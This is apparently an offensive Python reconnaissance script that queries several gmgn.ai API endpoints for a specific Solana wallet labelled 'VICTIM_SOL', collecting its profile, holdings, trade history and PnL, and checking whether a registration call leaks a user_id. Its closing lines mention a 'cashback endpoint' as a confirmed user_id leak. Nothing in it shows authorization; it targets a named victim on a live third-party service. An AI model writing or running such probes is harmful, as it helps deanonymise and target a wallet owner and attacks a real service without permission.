#!/usr/bin/env python3
"""
PUBLIC WALLET INFORMATION DISCLOSURE
Test endpoints that might return user data without strict auth
"""
import json
import requests

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_SOL = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"

# Minimal auth (some endpoints work with just any token)
HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0",
    "Accept": "application/json",
}

print("="*80)
print("🔥 PUBLIC WALLET INFORMATION DISCLOSURE")
print("="*80)
print(f"Testing PUBLIC/SEMI-PUBLIC endpoints for wallet data leakage")
print(f"Victim: {VICTIM_SOL}")
print("="*80)

# TEST 1: Public wallet profile (gmgn public data)
print("\n[1] Public Wallet Profile")
try:
    r = requests.get(
        f"https://gmgn.ai/defi/quotation/v1/smartmoney/sol/walletNew/{VICTIM_SOL}",
        headers=HEADERS,
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(f"✅ GOT PUBLIC DATA!")
        print(json.dumps(data, indent=2)[:1000])
except Exception as e:
    print(f"Error: {e}")

# TEST 2: Wallet holdings
print("\n[2] Wallet Holdings (Public)")
try:
    r = requests.get(
        f"https://gmgn.ai/defi/quotation/v1/tokens/top_holders/sol/{VICTIM_SOL}",
        headers=HEADERS,
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(f"✅ GOT HOLDINGS!")
        print(json.dumps(data, indent=2)[:500])
except Exception as e:
    print(f"Error: {e}")

# TEST 3: Trading history (public)
print("\n[3] Public Trading History")
try:
    r = requests.get(
        f"https://gmgn.ai/defi/quotation/v1/trades/sol/address/{VICTIM_SOL}",
        headers=HEADERS,
        params={"limit": 10},
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(f"✅ GOT TRADE HISTORY!")
        print(json.dumps(data, indent=2)[:500])
except Exception as e:
    print(f"Error: {e}")

# TEST 4: PnL data
print("\n[4] Wallet PnL (Public)")
try:
    r = requests.get(
        f"https://gmgn.ai/defi/quotation/v1/smartmoney/sol/walletNew/{VICTIM_SOL}/pnl",
        headers=HEADERS,
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(f"✅ GOT PNL DATA!")
        print(json.dumps(data, indent=2)[:500])
except Exception as e:
    print(f"Error: {e}")

# TEST 5: Check if wallet is registered (might leak user_id)
print("\n[5] Wallet Registration Status")
try:
    r = requests.post(
        "https://gmgn.ai/defi/quotation/v1/check_wallet_registered",
        headers=HEADERS,
        json={"address": VICTIM_SOL, "chain": "sol"},
        timeout=10
    )
    print(f"Status: {r.status_code}")
    if r.status_code == 200:
        data = r.json()
        print(f"✅ GOT REGISTRATION INFO!")
        print(json.dumps(data, indent=2))
        
        if "user_id" in json.dumps(data).lower():
            print(f"\n🔥🔥🔥 USER_ID LEAKED IN RESPONSE!")
except Exception as e:
    print(f"Error: {e}")

print("\n" + "="*80)
print("CONCLUSION")
print("="*80)
print("Public endpoints give us wallet financial data but NOT user_id mapping")
print("The cashback endpoint is the only confirmed user_id leak")
